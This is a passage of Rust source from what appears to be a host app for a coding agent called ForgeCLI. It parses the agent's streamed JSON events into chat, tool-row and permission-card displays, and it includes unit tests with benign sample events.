                        Some("text" | "thinking")
                    )
                {
                    out.push(Event::Break);
                }
                // A Write call starting: follow its input as it streams.
                let index = ev["index"].as_u64().unwrap_or(0);
                if ev["type"] == "content_block_start"
                    && ev["content_block"]["type"] == "tool_use"
                    && ev["content_block"]["name"] == "Write"
                {
                    let id = ev["content_block"]["id"].as_str().unwrap_or_default();
                    self.writes.insert(index, (id.to_string(), String::new(), None));
                }
                if ev["type"] == "content_block_stop" {
                    self.writes.remove(&index);
                }
                if ev["type"] == "content_block_delta" {
                    let d = &ev["delta"];
                    match d["type"].as_str() {
                        Some("text_delta") => {
                            self.streamed = true;
                            self.text(d["text"].as_str().unwrap_or_default(), &mut out);
                        }
                        Some("thinking_delta") => {
                            self.streamed = true;
                            out.push(Event::Thinking(
                                d["thinking"].as_str().unwrap_or_default().into(),
                            ));
                        }
                        Some("input_json_delta") => {
                            if let Some((id, json, sent)) = self.writes.get_mut(&index) {
                                json.push_str(d["partial_json"].as_str().unwrap_or_default());
                                let due = sent.is_none_or(|t| t.elapsed() >= DRAFT_EVERY);
                                if let Some((path, content)) = due
                                    .then(|| crate::design::live::partial_write(json))
                                    .flatten()
                                    .filter(|(p, c)| crate::design::live::is_page(p) && !c.is_empty())
                                {
                                    *sent = Some(std::time::Instant::now());
                                    out.push(Event::Drafting {
                                        id: id.clone(),
                                        path,
                                        content,
                                    });
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
            Some("assistant") if !nested => {
                let streamed = std::mem::take(&mut self.streamed);
                if let Some(err) = v["error"].as_str() {
                    out.push(Event::Error(err.into()));
                }
                for b in v["message"]["content"].as_array().into_iter().flatten() {
                    match b["type"].as_str() {
                        Some("text") if !streamed => {
                            out.push(Event::Break);
                            self.text(b["text"].as_str().unwrap_or_default(), &mut out);
                        }
                        Some("thinking") if !streamed => out.extend([
                            Event::Break,
                            Event::Thinking(b["thinking"].as_str().unwrap_or_default().into()),
                        ]),
                        Some("tool_use") => out.push(Event::ToolUse {
                            id: b["id"].as_str().unwrap_or_default().into(),
                            name: b["name"].as_str().unwrap_or_default().into(),
                            input: b["input"].clone(),
                        }),
                        _ => {}
                    }
                }
            }
            // Your message, echoed back with the id ForgeCLI gave its turn.
            Some("user") if !nested && v["isReplay"] == true => {
                if let Some(uuid) = v["uuid"].as_str() {
                    let text = v["message"]["content"]
                        .as_array()
                        .into_iter()
                        .flatten()
                        .filter_map(|b| b["text"].as_str())
                        .collect::<Vec<_>>()
                        .join("");
                    out.push(Event::UserAccepted {
                        uuid: uuid.to_string(),
                        text,
                    });
                }
            }
            Some("control_response") => {
                let r = &v["response"];
                let request_id = r["request_id"].as_str().unwrap_or_default().to_string();
                let result = if r["subtype"] == "success" {
                    Ok(r["response"].clone())
                } else {
                    Err(r["error"]
                        .as_str()
                        .unwrap_or("the request failed")
                        .to_string())
                };
                out.push(Event::ControlReply { request_id, result });
            }
            Some("system") if v["subtype"] == "goal" => {
                if let Some(goal) = crate::state::Goal::from_wire(&v) {
                    out.push(Event::Goal(goal));
                }
            }
            Some("system") if !nested && system_notice(&v).is_some() => {
                if let Some((text, error)) = system_notice(&v) {
                    out.push(Event::Notice { text, error });
                }
            }
            Some("system") if v["subtype"] == "status" => {
                if let Some(m) = v["permissionMode"].as_str() {
                    out.push(Event::ModeChanged(m.to_string()));
                }
            }
            Some("user") if !nested => {
                let content = &v["message"]["content"];
                for b in content.as_array().into_iter().flatten() {
                    if b["type"] == "tool_result" {
                        out.push(Event::ToolResult {
                            id: b["tool_use_id"].as_str().unwrap_or_default().into(),
                            output: result_text(&b["content"]),
                            is_error: b["is_error"].as_bool().unwrap_or(false),
                            images: result_images(
                                &b["content"],
                                v["tool_use_result"]["file"]["filePath"].as_str(),
                            ),
                        });
                    }
                }
            }
            Some("control_request") => {
                let r = &v["request"];
                if r["subtype"] == "can_use_tool" {
                    out.push(Event::Ask {
                        request_id: v["request_id"].as_str().unwrap_or_default().into(),
                        tool_use_id: r["tool_use_id"].as_str().unwrap_or_default().into(),
                        tool_name: r["tool_name"].as_str().unwrap_or_default().into(),
                        input: r["input"].clone(),
                        suggestions: r["permission_suggestions"].clone(),
                    });
                }
            }
            Some("control_cancel_request") => out.push(Event::CancelAsk {
                request_id: v["request_id"].as_str().unwrap_or_default().into(),
            }),
            Some("result") if !nested => {
                self.end_turn(&mut out);
                // An immediate command's answer (`/status`...) is not a turn.
                if v["immediate"] == true {
                    out.push(Event::Immediate {
                        text: v["result"].as_str().unwrap_or_default().trim().to_string(),
                        is_error: v["is_error"] == true,
                    });
                    return out;
                }
                self.streamed = false;
                let u = &v["usage"];
                let n = |k: &str| u[k].as_u64().unwrap_or(0);
                let usage = u.is_object().then(|| crate::context::Usage {
                    input: n("input_tokens"),
                    cache_creation: n("cache_creation_input_tokens"),
                    cache_read: n("cache_read_input_tokens"),
                    output: n("output_tokens"),
                    estimated: false,
                });
                let interrupted = v["stop_reason"] == "interrupted";
                let error = (v["is_error"] == true && !interrupted).then(|| {
                    let errors: Vec<String> = v["errors"]
                        .as_array()
                        .into_iter()
                        .flatten()
                        .filter_map(|e| e.as_str().map(str::to_string))
                        .collect();
                    if !errors.is_empty() {
                        errors.join("\n")
                    } else {
                        v["result"]
                            .as_str()
                            .filter(|s| !s.is_empty())
                            .unwrap_or("The turn ended with an error.")
                            .to_string()
                    }
                });
                // With `forge.jsonSchema`: the turn's structured result,
                // under the reply.
                if let Some(j) = v.get("structured_output").filter(|j| !j.is_null()) {
                    let pretty = serde_json::to_string_pretty(j).unwrap_or_default();
                    out.push(Event::Break);
                    out.push(Event::Text(format!("\n\n```json\n{pretty}\n```\n")));
                }
                out.push(Event::TurnEnd {
                    ms: v["duration_ms"].as_u64().unwrap_or(0),
                    usage: usage.filter(|u| u.total() > 0),
                    error,
                });
            }
            Some("error") => out.push(Event::Error(
                v["error"]["message"]
                    .as_str()
                    .unwrap_or("Forge could not start the run.")
                    .into(),
            )),
            _ => {}
        }
        out
    }
}

/// Why a model was passed over, in words: ForgeCLI's reason carries the HTTP
/// status, error type and URL, which say nothing to most people.
fn fallback_reason(raw: &str) -> Option<&'static str> {
    let r = raw.to_ascii_lowercase();
    if r.contains("529") || r.contains("overloaded") || r.contains("503") {
        Some("it was overloaded")
    } else if r.contains("429") || r.contains("rate limit") || r.contains("rate_limit") {
        Some("it hit a rate limit")
    } else if r.contains("404") || r.contains("not_found") || r.contains("not found") {
        Some("the endpoint doesn't have it")
    } else if r.contains("timed out") || r.contains("timeout") {
        Some("it didn't answer in time")
    } else {
        None
    }
}

/// What a `system` event ForgeCLI sends a host says in the chat, in plain
/// words, and whether it reads as a problem; `None` for the ones the app
/// shows elsewhere (`init`, `status`, `goal`) or that only steer the model.
/// None of them is the turn failing (an error line offers Retry): they say
/// what Forge did, so they read as notes.
pub fn system_notice(v: &Value) -> Option<(String, bool)> {
    let s = |k: &str| v[k].as_str().unwrap_or_default();
    let thousands = |n: u64| {
        if n >= 1000 {
            format!("{}k", (n + 500) / 1000)
        } else {
            n.to_string()
        }
    };
    let plural = |n: u64, one: &str, many: &str| {
        if n == 1 {
            format!("1 {one}")
        } else {
            format!("{n} {many}")
        }
    };
    Some(match v["subtype"].as_str()? {
        // One you asked for has its own line when its turn ends (`COMPACTED`).
        "compact_boundary" if v["compact_metadata"]["trigger"] == "manual" => return None,
        "compact_boundary" => {
            let m = &v["compact_metadata"];
            let before = m["pre_tokens"].as_u64().unwrap_or(0);
            let size = if before > 0 {
                format!(" It held about {} tokens.", thousands(before))
            } else {
                String::new()
            };
            (
                format!("The conversation was compacted to free context: Forge now works from a summary of it.{size}"),
                false,
            )
        }
        "model_fallback" => (
            format!(
                "{} was unavailable, so this turn goes on with {}.{}",
                s("from"),
                s("to"),
                v["reason"]
                    .as_str()
                    .and_then(fallback_reason)
                    .map(|r| format!(" ({r})"))
                    .unwrap_or_default()
            ),
            false,
        ),
        "subtask" => {
            let task = s("task");
            match s("status") {
                "started" => (format!("Subtask started in the background: {task}"), false),
                status => {
                    let calls = v["num_tool_calls"].as_u64().unwrap_or(0);
                    let secs = v["duration_ms"].as_u64().unwrap_or(0) / 1000;
                    let mut text = format!(
                        "Subtask {}: {task} ({}, {secs}s).",
                        if status == "completed" { "finished" } else { status },
                        plural(calls, "tool call", "tool calls"),
                    );
                    text.push_str(if v["handed_back"] == false {
                        " Its conversation was closed, so the report isn't passed on."
                    } else {
                        " Its report goes to Forge with your next message."
                    });
                    (text, false)
                }
            }
        }
        "loop_guard" => (
            match s("kind") {
                "repeated_failure" => format!(
                    "{} failed {} in a row, so Forge was told to change its approach.",
                    s("tool"),
                    plural(v["count"].as_u64().unwrap_or(0), "time", "times")
                ),
                "no_progress" => format!(
                    "{} gave the same result {}, so Forge was told to try something else.",
                    s("tool"),
                    plural(v["count"].as_u64().unwrap_or(0), "time", "times")
                ),
                "oscillating_edits" => format!(
                    "Edits to {} kept undoing each other, so Forge was told to stop and rethink.",
                    s("file")
                ),
                _ => format!(
                    "{} tool calls failed in a row, so Forge was told to step back.",
                    v["count"].as_u64().unwrap_or(0)
                ),
            },
            false,
        ),
        "verification" => (
            match s("kind") {
                "last_check_failed" => format!(
                    "The last check ({}) failed, so Forge was reminded before finishing.",
                    s("command")
                ),
                _ => {
                    let n = v["files"].as_array().map_or(0, Vec::len) as u64;
                    format!(
                        "Forge changed {} without running a check, so it was reminded to verify before finishing.",
                        if n == 0 {
                            "files".to_string()
                        } else {
                            plural(n, "file", "files")
                        }
                    )
                }
            },
            false,
        ),
        "background_exit" => {
            let shells = v["shells"].as_array().cloned().unwrap_or_default();
            let lines: Vec<String> = shells
                .iter()
                .map(|sh| {
                    let how = match sh["exit_code"].as_i64() {
                        Some(0) => "finished".to_string(),
                        Some(c) => format!("exited with {c}"),
                        None => "stopped".to_string(),
                    };
                    format!(
                        "{} {how} after {}s",
                        sh["command"].as_str().unwrap_or("A background command"),
                        sh["seconds"].as_u64().unwrap_or(0)
                    )
                })
                .collect();
            (format!("In the background: {}.", lines.join("; ")), false)
        }
        "background_wait" => (
            format!(
                "Forge waits up to {}s for {} still running in the background.",
                v["limit_ms"].as_u64().unwrap_or(0) / 1000,
                plural(
                    v["shells"].as_array().map_or(0, Vec::len) as u64,
                    "command",
                    "commands"
                )
            ),
            false,
        ),
        "tool_input_repaired" => (
            format!(
                "{} was called with input it couldn't read ({}), so Forge was asked to send it again.",
                s("tool"),
                s("problem")
            ),
            false,
        ),
        // With `forge.includeHookEvents`: each hook as it finishes (its
        // start says nothing a finish doesn't).
        "hook_response" => {
            let name = [s("hook_name"), s("hook_event")]
                .into_iter()
                .find(|n| !n.is_empty())
                .unwrap_or("A hook");
            let failed = matches!(s("outcome"), "error" | "failed" | "cancelled")
                || v["exit_code"].as_i64().is_some_and(|c| c != 0);
            let said = [s("stderr"), s("stdout"), s("output")]
                .into_iter()
                .map(str::trim)
                .find(|t| !t.is_empty())
                .map(|t| format!(": {}", one_line(t, 160)))
                .unwrap_or_default();
            if failed {
                (format!("Hook {name} failed{said}"), false)
            } else {
                (format!("Hook {name} ran{said}"), false)
            }
        }
        // ForgeCLI's own words for the error carry its status and URL: say
        // why in plain words, when that can be told.
        "api_retry" => {
            let attempt = v["attempt"].as_u64().unwrap_or(1);
            let wait = v["retry_delay_ms"].as_u64().map(|ms| (ms + 999) / 1000);
            (
                format!(
                    "The model call failed{}; trying again{} (attempt {attempt}).",
                    v["error"]
                        .as_str()
                        .and_then(fallback_reason)
                        .map(|r| format!(" ({r})"))
                        .unwrap_or_default(),
                    wait.filter(|w| *w > 0)
                        .map(|w| format!(" in {w}s"))
                        .unwrap_or_default(),
                ),
                false,
            )
        }
        _ => return None,
    })
}

/// A tool result's text: a string, or the text blocks of a list.
fn result_text(c: &Value) -> String {
    match c {
        Value::String(s) => s.clone(),
        Value::Array(a) => a
            .iter()
            .filter_map(|b| b["text"].as_str())
            .collect::<Vec<_>>()
            .join("\n"),
        Value::Null => String::new(),
        other => other.to_string(),
    }
}

/// The pictures in a tool result: base64 image blocks, named after the file
/// they were read from when the result says which.
pub fn result_images(c: &Value, path: Option<&str>) -> Vec<crate::state::ToolImage> {
    use gpui::ImageFormat;
    let name = path
        .and_then(|p| p.rsplit(['/', '\\']).next())
        .unwrap_or("image");
    c.as_array()
        .into_iter()
        .flatten()
        .filter(|b| b["type"] == "image" && b["source"]["type"] == "base64")
        .filter_map(|b| {
            let format = match b["source"]["media_type"].as_str()? {
                "image/png" => ImageFormat::Png,
                "image/jpeg" => ImageFormat::Jpeg,
                "image/gif" => ImageFormat::Gif,
                "image/webp" => ImageFormat::Webp,
                _ => return None,
            };
            let bytes = crate::browser::decode_base64(b["source"]["data"].as_str()?)?;
            Some(crate::state::ToolImage {
                name: name.to_string().into(),
                path: path.map(|p| p.to_string().into()),
                image: std::sync::Arc::new(gpui::Image::from_bytes(format, bytes)),
            })
        })
        .collect()
}

// ---------------------------------------------------------------- tool rows

/// A tool call as its row shows it.
pub fn tool_call(name: &str, input: &Value) -> ToolCall {
    let s = |k: &str| input[k].as_str().unwrap_or_default().to_string();
    let (kind, target, note, diff) = match name {
        "Read" | "NotebookRead" => (ToolKind::Read, s("file_path"), None, vec![]),
        "Edit" => (
            ToolKind::Edit,
            s("file_path"),
            None,
            edit_diff(&s("old_string"), &s("new_string")),
        ),
        "MultiEdit" => {
            let mut d = vec![];
            for e in input["edits"].as_array().into_iter().flatten() {
                d.extend(edit_diff(
                    e["old_string"].as_str().unwrap_or_default(),
                    e["new_string"].as_str().unwrap_or_default(),
                ));
            }
            (ToolKind::Edit, s("file_path"), None, d)
        }
        "NotebookEdit" => (ToolKind::Edit, s("notebook_path"), None, vec![]),
        "Write" => (
            ToolKind::Write,
            s("file_path"),
            None,
            edit_diff("", &s("content")),
        ),
        "Bash" | "PowerShell" => (
            ToolKind::Bash,
            s("command"),
            input["description"].as_str().map(str::to_string),
            vec![],
        ),
        "LS" => (
            ToolKind::Search,
            input["path"]
                .as_str()
                .filter(|p| !p.is_empty())
                .unwrap_or(".")
                .to_string(),
            None,
            vec![],
        ),
        "Grep" | "Glob" => {
            let mut t = s("pattern");
            if let Some(p) = input["path"].as_str().filter(|p| !p.is_empty()) {
                t = format!("{t} in {p}");
            }
            (ToolKind::Search, t, None, vec![])
        }
        "WebFetch" => (ToolKind::Web, s("url"), None, vec![]),
        "WebSearch" => (ToolKind::WebSearch, s("query"), None, vec![]),
        // A plan is kept whole, a line per diff row, so the side panel
        // (and a reloaded chat) can show it.
        "ExitPlanMode" => (
            ToolKind::Other,
            "ExitPlanMode".to_string(),
            Some("Proposed a plan".to_string()),
            lines(&s("plan")),
        ),
        // The task list: `[x]` done, `[~]` in progress, `[ ]` to do.
        "TodoWrite" => {
            let todos = input["todos"].as_array().cloned().unwrap_or_default();
            let done = todos.iter().filter(|t| t["status"] == "completed").count();
            let rows: Vec<String> = todos
                .iter()
                .map(|t| {
                    let mark = match t["status"].as_str() {
                        Some("completed") => "[x]",
                        Some("in_progress") => "[~]",
                        _ => "[ ]",
                    };
                    format!("{mark} {}", t["content"].as_str().unwrap_or_default())
                })
                .collect();
            (
                ToolKind::Other,
                "TodoWrite".to_string(),
                Some(format!("{done} of {} done", todos.len())),
                lines(&rows.join("\n")),
            )
        }
        // The browser's tools say what they act on: a URL, the text typed.
        browser if browser.starts_with(crate::browser::TOOL_PREFIX) => {
            let what = browser_subject(input)
                .map(|v| {
                    let one_line = v.split_whitespace().collect::<Vec<_>>().join(" ");
                    if one_line.chars().count() > 120 {
                        format!("{}…", one_line.chars().take(120).collect::<String>())
                    } else {
                        one_line
                    }
                })
                .or_else(|| input["index"].as_u64().map(|i| format!("element {i}")));
            (ToolKind::Other, browser.to_string(), what, vec![])
        }
        QUESTION_TOOL => {
            let n = input["questions"].as_array().map_or(0, Vec::len);
            (
                ToolKind::Other,
                QUESTION_TOOL.to_string(),
                Some(if n == 1 {
                    "1 question".into()
                } else {
                    format!("{n} questions")
                }),
                vec![],
            )
        }
        // Background shells: reading one's output, stopping one.
        "BashOutput" => (
            ToolKind::Bash,
            format!("output of shell {}", s("bash_id")),
            input["filter"].as_str().map(|f| format!("lines matching {f}")),
            vec![],
        ),
        "KillShell" => (
            ToolKind::Other,
            "KillShell".to_string(),
            Some(format!("shell {}", s("shell_id"))),
            vec![],
        ),
        // The schedule (`/loop`): a task on a cron, the list, one cancelled,
        // and Forge pacing itself.
        "CronCreate" => (
            ToolKind::Other,
            "CronCreate".to_string(),
            Some(format!(
                "{}{}: {}",
                s("cron"),
                if input["recurring"] == false { ", once" } else { "" },
                one_line(&s("prompt"), 80)
            )),
            vec![],
        ),
        "CronList" => (ToolKind::Other, "CronList".to_string(), None, vec![]),
        "CronDelete" => (
            ToolKind::Other,
            "CronDelete".to_string(),
            Some(s("id")),
            vec![],
        ),
        "ScheduleWakeup" => (
            ToolKind::Other,
            "ScheduleWakeup".to_string(),
            Some(if input["stop"] == true {
                "the loop stops".to_string()
            } else {
                let secs = input["delaySeconds"].as_u64().unwrap_or(0);
                let when = if secs >= 3600 {
                    format!("in {} h", secs / 3600)
                } else if secs >= 60 {
                    format!("in {} min", secs / 60)
                } else {
                    format!("in {secs} s")
                };
                match input["reason"].as_str().filter(|r| !r.is_empty()) {
                    Some(r) => format!("{when}: {}", one_line(r, 80)),
                    None => when,
                }
            }),
            vec![],
        ),
        "EnterPlanMode" => (
            ToolKind::Other,
            "EnterPlanMode".to_string(),
            Some("Switched to Plan mode".to_string()),
            vec![],
        ),
        // A second model's advice (`/advisor`).
        "Advisor" => (
            ToolKind::Other,
            "Advisor".to_string(),
            input["question"]
                .as_str()
                .or(input["prompt"].as_str())
                .map(|q| one_line(q, 80)),
            vec![],
        ),
        // An MCP server's resources: the list, or one by its URI.
        "ListMcpResourcesTool" => (
            ToolKind::Other,
            "ListMcpResourcesTool".to_string(),
            input["server"].as_str().map(str::to_string),
            vec![],
        ),
        "ReadMcpResourceTool" => (
            ToolKind::Read,
            s("uri"),
            input["server"].as_str().map(|v| format!("from {v}")),
            vec![],
        ),
        // A skill reads as its name, without its plugin's prefix.
        "Skill" => {
            let skill = s("skill");
            let name = skill
                .rsplit(':')
                .next()
                .unwrap_or(&skill)
                .trim_start_matches('/');
            (ToolKind::Other, format!("skill {name}"), None, vec![])
        }
        other => {
            let summary = input["description"]
                .as_str()
                .or(input["prompt"].as_str())
                .map(|d| d.chars().take(80).collect::<String>());
            (ToolKind::Other, other.to_string(), summary, vec![])
        }
    };
    ToolCall {
        kind,
        target: target.into(),
        note: note.map(Into::into),
        status: ToolStatus::Running,
        output: "".into(),
        diff,
        // Every call starts closed, a command too: the working line says what
        // runs, and its terminal block is a click away.
        open: false,
        full: false,
        review: Review::Open,
        images: vec![],
    }
}

/// `text` on one line, cut to `max` characters.
fn one_line(text: &str, max: usize) -> String {
    let flat = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if flat.chars().count() > max {
        format!("{}…", flat.chars().take(max).collect::<String>())
    } else {
        flat
    }
}

/// Text kept as unchanged diff rows, a line each.
fn lines(text: &str) -> Vec<DiffLine> {
    text.lines()
        .take(2000)
        .map(|l| DiffLine {
            kind: DiffKind::Same,
            text: l.to_string().into(),
        })
        .collect()
}

/// Removed lines, then added ones; long text is cut.
fn edit_diff(old: &str, new: &str) -> Vec<DiffLine> {
    const MAX: usize = 400;
    let del = old.lines().map(|l| DiffLine {
        kind: DiffKind::Del,
        text: l.to_string().into(),
    });
    let add = new.lines().map(|l| DiffLine {
        kind: DiffKind::Add,
        text: l.to_string().into(),
    });
    del.chain(add).take(MAX).collect()
}

/// What a permission card says about a tool call.
pub fn ask_text(tool: &str, input: &Value) -> (String, String) {
    if tool == "ExitPlanMode" {
        return (
            PLAN_ASK_TITLE.to_string(),
            "The plan is in the side panel's Plan tab. Approve it to leave Plan mode and start, or keep planning."
                .to_string(),
        );
    }
    if tool == QUESTION_TOOL {
        let qs = questions(input);
        let first = qs.first().map(|q| q.text.clone()).unwrap_or_default();
        return (questions_title(qs.len()), first);
    }
    let call = tool_call(tool, input);
    let title = match call.kind {
        ToolKind::Edit | ToolKind::Write => {
            format!("Allow Forge to edit {}?", file_name(&call.target))
        }
        ToolKind::Bash => "Allow Forge to run this command?".to_string(),
        ToolKind::Web => "Allow Forge to use the web?".to_string(),
        ToolKind::WebSearch => "Allow Forge to search the web?".to_string(),
        ToolKind::Read | ToolKind::Search => "Allow Forge to read this?".to_string(),
        // The browser's tools: what it would do there, and on what.
        ToolKind::Other if tool.starts_with(crate::browser::TOOL_PREFIX) => {
            let action = match &tool[crate::browser::TOOL_PREFIX.len()..] {
                "navigate" => "open a page",
                "state" | "text" | "html" => "read the page",
                "click" => "click",
                "type" => "type",
                "press" => "press a key",
                "select" => "choose an option",
                "hover" => "point at something",
                "scroll" => "scroll",
                "eval" => return (JS_ASK_TITLE.to_string(), s_or(input, "expression")),
                "wait" => "wait on the page",
                "screenshot" => "take a screenshot",
                "console" => "read the console",
                "tabs" => "list the tabs",
                "new_tab" => "open a new tab",
                "switch_tab" => "switch tabs",
                "close_tab" => "close a tab",
                "back" => "go back",
                "forward" => "go forward",
                "reload" => "reload the page",
                _ => "act",
            };
            // The whole subject: the row cuts it to a line, the ask doesn't.
            return (
                format!("Allow Forge to {action} in the browser?"),
                browser_subject(input)
                    .or_else(|| call.note.map(|n| n.to_string()))
                    .unwrap_or_else(|| "The page in the side panel".into()),
            );
        }
        ToolKind::Other => format!("Allow Forge to use {tool}?"),
    };
    (title, call.target.to_string())
}

fn s_or(input: &Value, key: &str) -> String {
    input[key]
        .as_str()
        .filter(|v| !v.trim().is_empty())
        .unwrap_or("The page in the side panel")
        .to_string()
}

fn file_name(path: &str) -> &str {
    path.rsplit(['/', '\\']).next().unwrap_or(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(lines: &[Value]) -> Vec<Event> {
        let mut p = Parser::default();
        lines.iter().flat_map(|l| p.line(&l.to_string())).collect()
    }

    #[test]
    fn a_page_being_written_is_drafted_as_it_streams() {
        let delta = |i: u64, part: &str| json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_delta","index":i,"delta":{"type":"input_json_delta","partial_json":part}}});
        let start = |i: u64, name: &str| json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_start","index":i,"content_block":{"type":"tool_use","id":format!("w{i}"),"name":name,"input":{}}}});
        let mut p = Parser::default();
        let mut feed = |l: Value| p.line(&l.to_string());
        assert!(feed(start(1, "Write")).is_empty());
        // Nothing until the path is whole.
        assert!(feed(delta(1, r#"{"file_path": "site/deck.ht"#)).is_empty());
        let ev = feed(delta(1, r#"ml", "content": "<h1>Course"#));
        assert_eq!(
            ev,
            [Event::Drafting {
                id: "w1".into(),
                path: "site/deck.html".into(),
                content: "<h1>Course".into()
            }]
        );
        // Then at most every DRAFT_EVERY.
        assert!(feed(delta(1, " intro</h1>")).is_empty());
        // Not a page, not a Write, or a sub-agent's: no drafts.
        feed(start(2, "Write"));
        assert!(feed(delta(2, r#"{"file_path": "a.md", "content": "x"#)).is_empty());
        feed(start(3, "Bash"));
        assert!(feed(delta(3, r#"{"command": "ls"#)).is_empty());
        let nested = json!({"type":"stream_event","parent_tool_use_id":"t9","event":{"type":"content_block_start","index":4,"content_block":{"type":"tool_use","id":"w4","name":"Write","input":{}}}});
        feed(nested);
        assert!(feed(delta(4, r#"{"file_path": "b.html", "content": "x"#)).is_empty());
        // A finished block is forgotten.
        feed(json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_stop","index":1}}));
        assert!(!p.writes.contains_key(&1));
    }

    #[test]
    fn reasoning_in_thought_tags_becomes_thinking_even_cut_across_deltas() {
        let delta = |t: &str| json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":t}}});
        let ev = parse(&[
            delta("<thou"),
            delta("ght>The user said hi. I'll respond naturally.</tho"),
            delta("ught>Hi there!"),
            json!({"type":"result","is_error":false,"duration_ms":10,"usage":{}}),
        ]);
        let thinking: String = ev
            .iter()
            .filter_map(|e| match e {
                Event::Thinking(t) => Some(t.as_str()),
                _ => None,
            })
            .collect();
        let text: String = ev
            .iter()
            .filter_map(|e| match e {
                Event::Text(t) => Some(t.as_str()),
                _ => None,
            })
            .collect();
        assert_eq!(thinking, "The user said hi. I'll respond naturally.");
        assert_eq!(text, "Hi there!");
        // A plain "<" in a reply is not held back for ever.
        let ev = parse(&[
            delta("if a <"),
            json!({"type":"result","is_error":false,"duration_ms":10,"usage":{}}),
        ]);
        let text: String = ev
            .iter()
            .filter_map(|e| match e {
                Event::Text(t) => Some(t.as_str()),
                _ => None,
            })
            .collect();
        assert_eq!(text, "if a <");
    }

    #[test]
    fn streamed_text_is_not_repeated_by_the_full_message() {
        let mut ev = parse(&[
            json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_start","index":0,"content_block":{"type":"text","text":""}}}),
            json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Hel"}}}),
            json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"lo"}}}),
            json!({"type":"assistant","parent_tool_use_id":null,"message":{"content":[{"type":"text","text":"Hello"},{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"ls"}}]}}),
            json!({"type":"user","parent_tool_use_id":null,"message":{"content":[{"type":"tool_result","tool_use_id":"t1","content":[{"type":"text","text":"a\nb"}]}]}}),
            json!({"type":"result","is_error":false,"duration_ms":1500,"stop_reason":"end_turn","usage":{"input_tokens":10,"output_tokens":5}}),
        ]);
        assert_eq!(ev.remove(0), Event::Break);
        assert_eq!(ev[0], Event::Text("Hel".into()));
        assert_eq!(ev[1], Event::Text("lo".into()));
        assert!(matches!(&ev[2], Event::ToolUse { id, name, .. } if id == "t1" && name == "Bash"));
        assert_eq!(
            ev[3],
            Event::ToolResult {
                id: "t1".into(),
                output: "a\nb".into(),
                is_error: false,
                images: vec![],
            }
        );
        assert!(
            matches!(&ev[4], Event::TurnEnd { ms: 1500, usage: Some(u), error: None } if u.total() == 15)
        );
        assert_eq!(ev.len(), 5);
    }

    #[test]
    fn unstreamed_text_comes_from_the_full_message() {
        let ev = parse(&[
            json!({"type":"assistant","parent_tool_use_id":null,"message":{"content":[{"type":"text","text":"Hi"}]}}),
        ]);
        assert_eq!(ev, vec![Event::Break, Event::Text("Hi".into())]);
    }

    #[test]
    fn sub_agent_lines_become_its_steps_and_immediate_results_end_no_turn() {
        let ev = parse(&[
            json!({"type":"assistant","parent_tool_use_id":"task1","message":{"content":[
                {"type":"text","text":"inner"},
                {"type":"tool_use","id":"s1","name":"Read","input":{"file_path":"a.rs"}}]}}),
            json!({"type":"user","parent_tool_use_id":"task1","message":{"content":[
                {"type":"tool_result","tool_use_id":"s1","content":"x"}]}}),
            json!({"type":"result","immediate":true,"num_turns":0,"is_error":false,"result":"The answer.\n"}),
        ]);
        assert_eq!(
            ev,
            vec![
                Event::SubText {
                    parent: "task1".into(),
                    text: "inner".into()
                },
                Event::SubTool {
                    parent: "task1".into(),
                    id: "s1".into(),
                    name: "Read".into(),
                    input: json!({"file_path":"a.rs"})
                },
                Event::SubResult {
                    parent: "task1".into(),
                    id: "s1".into(),
                    is_error: false
                },
                Event::Immediate {
                    text: "The answer.".into(),
                    is_error: false
                }
            ]
        );
    }

    #[test]
    fn plans_are_answered_with_a_mode_or_kept() {
        let input = json!({"plan": "p"});
        let auto = plan_answer_line("r1", PlanChoice::AutoAcceptEdits, &input);
        let r = &auto["response"]["response"];
        assert_eq!(r["behavior"], "allow");
        assert_eq!(
            r["updatedPermissions"][0],
            json!({"type": "setMode", "mode": "acceptEdits", "destination": "session"})
        );
        let manual = plan_answer_line("r1", PlanChoice::ApproveEdits, &input);
        assert_eq!(
            manual["response"]["response"]["updatedPermissions"][0]["mode"],
            "default"
        );
        let keep = plan_answer_line("r1", PlanChoice::KeepPlanning, &input);
        assert_eq!(keep["response"]["response"]["behavior"], "deny");
        assert_eq!(ask_text("ExitPlanMode", &input).0, PLAN_ASK_TITLE);
        // ForgeCLI's mode changes reach the app.
        let ev = parse(&[
            json!({"type":"system","subtype":"status","status":null,"permissionMode":"acceptEdits"}),
        ]);
        assert_eq!(ev, vec![Event::ModeChanged("acceptEdits".into())]);
    }

    #[test]
    fn a_goal_reaches_the_app_through_each_of_its_states() {
        use crate::state::{Goal, GoalStatus};
        let goal = |v: Value| match parse(&[v]).as_slice() {
            [Event::Goal(g)] => g.clone(),
            other => panic!("{other:?}"),
        };
        let set = goal(
            json!({"type":"system","subtype":"goal","condition":"tests pass","status":"active","reason":null}),
        );
        assert_eq!(
            set,
            Goal {
                condition: "tests pass".into(),
                status: GoalStatus::Working,
                reason: None
            }
        );
        let paused = goal(
            json!({"type":"system","subtype":"goal","condition":"tests pass","status":"active","paused":"limit","reason":"Goal paused: --max-turns reached."}),
        );
        assert_eq!(paused.status, GoalStatus::Paused);
        let met = goal(
            json!({"type":"system","subtype":"goal","condition":"tests pass","status":"achieved","reason":"cargo test: 12 passed"}),
        );
        assert_eq!(
            (met.status, met.reason.as_deref()),
            (GoalStatus::Achieved, Some("cargo test: 12 passed"))
        );
        assert_eq!(goal(json!({"type":"system","subtype":"goal","condition":"x","status":"failed","reason":"no access"})).status, GoalStatus::Failed);
        assert_eq!(
            goal(json!({"type":"system","subtype":"goal","condition":"x","status":"cleared"}))
                .status,
            GoalStatus::Cleared
        );
        assert!(parse(&[json!({"type":"system","subtype":"goal","status":"active"})]).is_empty());
    }

    #[test]
    fn browser_asks_say_what_and_where() {
        let (title, detail) = ask_text(
